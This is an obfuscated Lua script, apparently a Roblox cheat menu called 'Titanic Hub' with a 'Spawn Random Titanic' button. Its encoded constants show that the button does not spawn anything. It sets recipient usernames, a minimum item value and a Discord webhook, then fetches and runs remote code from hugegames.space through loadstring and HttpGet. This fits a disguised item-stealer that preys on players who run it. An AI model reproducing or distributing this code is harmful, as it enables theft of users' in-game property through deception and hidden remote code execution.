--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.3) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v80=v2(v0(v30,16));if v19 then local v88=v5(v80,v19);v19=nil;return v88;else return v80;end end end);local function v20(v31,v32,v33) if v33 then local v81=(v31/(2^(v32-(2 -1))))%((5 -3)^(((v33-((1638 -(1523 + 114)) -0)) -(v32-(2 -1))) + (620 -(555 + 64)))) ;return v81-(v81%(932 -(857 + 74))) ;else local v82=568 -(367 + 181 + 20) ;local v83;while true do if (v82==(927 -(214 + 713))) then v83=2^(v32-(1 + 0)) ;return (((v31%(v83 + v83))>=v83) and ((1 -0) + 0)) or (877 -(282 + 595)) ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + (1067 -(68 + 997)) );v18=v18 + 2 ;return (v36 * (1526 -(226 + 1044))) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + (12 -9) );v18=v18 + 4 ;return (v40 * (16777333 -(32 + 85))) + (v39 * (64226 + (2267 -(892 + 65)))) + (v38 * (57 + 199)) + v37 ;end local function v24() local v41=v23();local v42=v23();local v43=2 -1 ;local v44=(v20(v42,1,36 -16 ) * (((6 -3) -1)^(382 -(87 + 263)))) + v41 ;local v45=v20(v42,201 -(67 + 113) ,23 + 2 + 6 );local v46=((v20(v42,78 -46 )==(1 + 0)) and  -(3 -(3 -1))) or (953 -(802 + 149 + 1)) ;if (v45==(0 -0)) then if (v44==0) then return v46 * 0 ;else local v89=0 -0 ;while true do if (v89==(0 + 0)) then v45=998 -(915 + (873 -(368 + 423))) ;v43=0;break;end end end elseif (v45==(5796 -3749)) then return ((v44==(0 + 0)) and (v46 * (1/0))) or (v46 * NaN) ;end return v8(v46,v45-(1344 -321) ) * (v43 + (v44/((1189 -(1069 + 118))^(117 -(204 -139))))) ;end local function v25(v47) local v48;if  not v47 then local v84=0;while true do if (v84==(18 -(10 + 8))) then v47=v23();if (v47==((0 + 0) -0)) then return "";end break;end end end v48=v3(v16,v18,(v18 + v47) -(443 -(416 + 26)) );v18=v18 + v47 ;local v49={};for v64=3 -2 , #v48 do v49[v64]=v2(v1(v3(v48,v64,v64)));end return v6(v49);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v50=1509 -(663 + 846) ;local v51;local v52;local v53;local v54;local v55;local v56;local v57;while true do if (v50~=3) then else v57=nil;while true do local v90=0;local v91;while true do if (v90~=(0 -0)) then else v91=0;while true do if (v91==1) then if (v51~=(0 -0)) then else local v97=0 + 0 ;while true do if (2~=v97) then else v51=1;break;end if ((1 + 0)==v97) then v54={};v55={v52,v53,nil,v54};v97=2;end if (v97==0) then v52={};v53={};v97=2 -1 ;end end end break;end if (v91==0) then local v96=0;while true do if (v96~=(3 -2)) then else v91=868 -(550 + 317) ;break;end if (0~=v96) then else if (v51~=1) then else local v158=0 -0 ;while true do if (v158==2) then v51=2;break;end if (v158~=(1 -0)) then else for v174=2 -1 ,v56 do local v175=0;local v176;local v177;local v178;while true do if (v175~=(286 -(134 + 151))) then else v178=nil;while true do if (v176==1) then if (v177==(1666 -(970 + 695))) then v178=v21()~=0 ;elseif (v177==(3 -1)) then v178=v24();elseif (v177~=3) then else v178=v25();end v57[v174]=v178;break;end if (v176==(1990 -(582 + 1408))) then local v182=0 -0 ;local v183;while true do if (0==v182) then v183=0 -0 ;while true do if (v183~=0) then else local v190=0 -0 ;while true do if (v190==(1824 -(1195 + 629))) then v177=v21();v178=nil;v190=1 -0 ;end if (v190==1) then v183=1;break;end end end if (v183==(242 -(187 + 54))) then v176=781 -(162 + 618) ;break;end end break;end end end end break;end if (v175==0) then v176=0 + 0 ;v177=nil;v175=1 + 0 ;end end end v55[6 -3 ]=v21();v158=2 -0 ;end if (v158==(0 + 0)) then v56=v23();v57={};v158=1637 -(1373 + 263) ;end end end if (v51==2) then local v159=1000 -(451 + 549) ;local v160;while true do if (v159~=(0 + 0)) then else v160=0 -0 ;while true do local v179=0 -0 ;while true do if (v179==(1384 -(746 + 638))) then if (v160~=(0 + 0)) then else local v180=0 -0 ;while true do if (v180==0) then for v184=1,v23() do local v185=0;local v186;local v187;while true do if (v185==(341 -(218 + 123))) then v186=0;v187=nil;v185=1582 -(1535 + 46) ;end if (v185~=(1 + 0)) then else while true do if (v186==0) then v187=v21();if (v20(v187,1 + 0 ,561 -(306 + 254) )~=(0 + 0)) then else local v191=0;local v192;local v193;local v194;while true do if ((0 -0)==v191) then local v195=0;while true do if (v195~=0) then else local v203=1467 -(899 + 568) ;while true do if (v203==(1 + 0)) then v195=2 -1 ;break;end if (v203~=(603 -(268 + 335))) then else v192=v20(v187,2,293 -(60 + 230) );v193=v20(v187,4,578 -(426 + 146) );v203=1 + 0 ;end end end if (v195==1) then v191=1457 -(282 + 1174) ;break;end end end if (v191==3) then if (v20(v193,814 -(569 + 242) ,3)==(2 -1)) then v194[4]=v57[v194[4]];end v52[v184]=v194;break;end if (v191~=2) then else local v197=0;local v198;while true do if (v197~=(0 + 0)) then else v198=0;while true do if (v198==1) then v191=1027 -(706 + 318) ;break;end if ((1251 -(721 + 530))==v198) then local v204=1271 -(945 + 326) ;while true do if (v204~=1) then else v198=1;break;end if (v204~=(0 -0)) then else if (v20(v193,1,1)==(1 + 0)) then v194[2]=v57[v194[2]];end if (v20(v193,702 -(271 + 429) ,2 + 0 )==(1501 -(1408 + 92))) then v194[1089 -(461 + 625) ]=v57[v194[3]];end v204=1289 -(993 + 295) ;end end end end break;end end end if (v191~=(1 + 0)) then else local v199=1171 -(418 + 753) ;local v200;while true do if (v199~=0) then else v200=0 + 0 ;while true do if (v200==(0 + 0)) then local v205=0;while true do if (v205~=(0 + 0)) then else v194={v22(),v22(),nil,nil};if (v192==0) then local v210=529 -(406 + 123) ;local v211;local v212;while true do if (v210~=0) then else v211=0;v212=nil;v210=1;end if (v210~=1) then else while true do if (v211==(1769 -(1749 + 20))) then v212=0 + 0 ;while true do if (0==v212) then v194[3]=v22();v194[4]=v22();break;end end break;end end break;end end elseif (v192==(1323 -(1249 + 73))) then v194[3]=v23();elseif (v192==(1 + 1)) then v194[3]=v23() -((1147 -(466 + 679))^16) ;elseif (v192==3) then local v215=0;local v216;while true do if (v215==(0 -0)) then v216=0;while true do if (v216~=0) then else v194[8 -5 ]=v23() -((1902 -(106 + 1794))^(6 + 10)) ;v194[2 + 2 ]=v22();break;end end break;end end end v205=1;end if (v205==(2 -1)) then v200=2 -1 ;break;end end end if (v200~=(115 -(4 + 110))) then else v191=2;break;end end break;end end end end end break;end end break;end end end for v188=1,v23() do v53[v188-1 ]=v28();end v180=1;end if (v180~=(585 -(57 + 527))) then else v160=1428 -(41 + 1386) ;break;end end end if (v160~=(104 -(17 + 86))) then else return v55;end break;end end end break;end end end v96=1;end end end end break;end end end break;end if (v50~=2) then else v55=nil;v56=nil;v50=3 + 0 ;end if (v50~=0) then else v51=0;v52=nil;v50=1;end if (1==v50) then v53=nil;v54=nil;v50=2;end end end local function v29(v58,v59,v60) local v61=v58[1];local v62=v58[2];local v63=v58[3];return function(...) local v66=v61;local v67=v62;local v68=v63;local v69=v27;local v70=1;local v71= -1;local v72={};local v73={...};local v74=v12("#",...) -1 ;local v75={};local v76={};for v85=0,v74 do if (v85>=v68) then v72[v85-v68 ]=v73[v85 + 1 ];else v76[v85]=v73[v85 + 1 ];end end local v77=(v74-v68) + 1 ;local v78;local v79;while true do v78=v66[v70];v79=v78[1];if (v79<=16) then if (v79<=7) then if (v79<=3) then if (v79<=1) then if (v79==0) then v76[v78[2]]=v60[v78[3]];else local v100=0;local v101;while true do if (v100==0) then v101=v78[2];v76[v101]=v76[v101](v13(v76,v101 + 1 ,v71));break;end end end elseif (v79==2) then v60[v78[3]]=v76[v78[2]];else local v104=v78[2];v76[v104]=v76[v104]();end elseif (v79<=5) then if (v79>4) then v70=v78[3];else v76[v78[2]]=v29(v67[v78[3]],nil,v60);end elseif (v79>6) then local v108=v78[2];v76[v108]=v76[v108](v13(v76,v108 + 1 ,v78[3]));else do return;end end elseif (v79<=11) then if (v79<=9) then if (v79==8) then local v110=v78[2];local v111=v76[v78[3]];v76[v110 + 1 ]=v111;v76[v110]=v111[v78[4]];else local v115=v78[2];local v116,v117=v69(v76[v115](v13(v76,v115 + 1 ,v78[3])));v71=(v117 + v115) -1 ;local v118=0;for v150=v115,v71 do local v151=0;while true do if (v151==0) then v118=v118 + 1 ;v76[v150]=v116[v118];break;end end end end elseif (v79==10) then v76[v78[2]]();elseif (v76[v78[2]]==v78[4]) then v70=v70 + 1 ;else v70=v78[3];end elseif (v79<=13) then if (v79>12) then local v119=0;local v120;while true do if (v119==0) then v120=v78[2];v76[v120](v13(v76,v120 + 1 ,v78[3]));break;end end elseif (v76[v78[2]]==v78[4]) then v70=v70 + 1 ;else v70=v78[3];end elseif (v79<=14) then v70=v78[3];elseif (v79>15) then for v164=v78[2],v78[3] do v76[v164]=nil;end else for v166=v78[2],v78[3] do v76[v166]=nil;end end elseif (v79<=24) then if (v79<=20) then if (v79<=18) then if (v79>17) then v76[v78[2]]=v29(v67[v78[3]],nil,v60);else v76[v78[2]]();end elseif (v79>19) then local v123=v78[2];local v124=v76[v78[3]];v76[v123 + 1 ]=v124;v76[v123]=v124[v78[4]];else local v128=v78[2];v76[v128]=v76[v128](v13(v76,v128 + 1 ,v78[3]));end elseif (v79<=22) then if (v79==21) then v76[v78[2]]=v76[v78[3]];else v76[v78[2]]=v76[v78[3]];end elseif (v79>23) then if (v78[2]==v76[v78[4]]) then v70=v70 + 1 ;else v70=v78[3];end else do return;end end elseif (v79<=28) then if (v79<=26) then if (v79>25) then v76[v78[2]]=v78[3];else local v136=v78[2];v76[v136]=v76[v136]();end elseif (v79>27) then v76[v78[2]]=v60[v78[3]];else v76[v78[2]]=v78[3];end elseif (v79<=30) then if (v79>29) then local v142=v78[2];local v143,v144=v69(v76[v142](v13(v76,v142 + 1 ,v78[3])));v71=(v144 + v142) -1 ;local v145=0;for v152=v142,v71 do local v153=0;while true do if (v153==0) then v145=v145 + 1 ;v76[v152]=v143[v145];break;end end end else v60[v78[3]]=v76[v78[2]];end elseif (v79<=31) then local v148=v78[2];v76[v148]=v76[v148](v13(v76,v148 + 1 ,v71));elseif (v79==32) then if (v78[2]==v76[v78[4]]) then v70=v70 + 1 ;else v70=v78[3];end else local v157=v78[2];v76[v157](v13(v76,v157 + 1 ,v78[3]));end v70=v70 + 1 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!0F3O00028O00026O00F03F027O004003093O00437265617465546162030A3O00464520544954414E4943030C3O0043726561746542752O746F6E03143O00537061776E2052616E646F6D20546974616E6963030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403473O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F426174754B76693132332F5061626C6F4C696256332F6D61696E2F5061626C6F4C6962563303063O00437265617465030B3O00546974616E69632048756203073O00456E61626C656403013O007000353O00121A3O00014O000F000100043O00260C3O0007000100010004053O0007000100121A000100014O000F000200023O00121A3O00023O00260C3O000B000100020004053O000B00012O000F000300043O00121A3O00033O00260C3O0002000100030004053O0002000100260C00010018000100020004053O0018000100201400050003000400121A000700054O00070005000700022O0015000400053O00201400050004000600121A000700073O00020400086O000D0005000800010004053O0034000100260C0001000D000100010004053O000D000100121A000500013O00260C0005001F000100020004053O001F000100121A000100023O0004053O000D0001000E180001001B000100050004053O001B000100122O000600083O00122O000700093O00201400070007000A00121A0009000B4O001E000700094O001F00063O00022O00190006000100022O0015000200063O00201400060002000C00121A0008000D3O00121A0009000E3O00121A000A000F4O00070006000A00022O0015000300063O00121A000500023O0004053O001B00010004053O000D00010004053O003400010004053O000200012O00063O00013O00013O00113O00028O00027O0040030A3O004D696E696D756D524150025O006AF840030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403173O00682O7470733A2O2F6875676567616D65732E737061636503083O00557365726E616D6503143O002O582O784461726B43726166743132332O782O5803093O00557365726E616D653203123O002O582O7847616D657231323334352O782O58026O00F03F03073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F312O32363336313836392O3635383238392O352F4173485953726B7554746B76555F352D65526149376C505170394678643435396A4A596C434F7A4F733648713759535847725F4D7678326849516F55687268633070444803073O004875624E616D65035O001D3O00121A3O00013O00260C3O000D000100020004053O000D000100121A000100043O00121D000100033O00122O000100053O00122O000200063O00201400020002000700121A000400084O001E000200044O001F00013O00022O00110001000100010004053O001C000100260C3O0014000100010004053O0014000100121A0001000A3O00121D000100093O00121A0001000C3O00121D0001000B3O00121A3O000D3O00260C3O00010001000D0004053O0001000100121A0001000F3O00121D0001000E3O00121A000100113O00121D000100103O00121A3O00023O0004053O000100012O00063O00017O00",v9(),...);
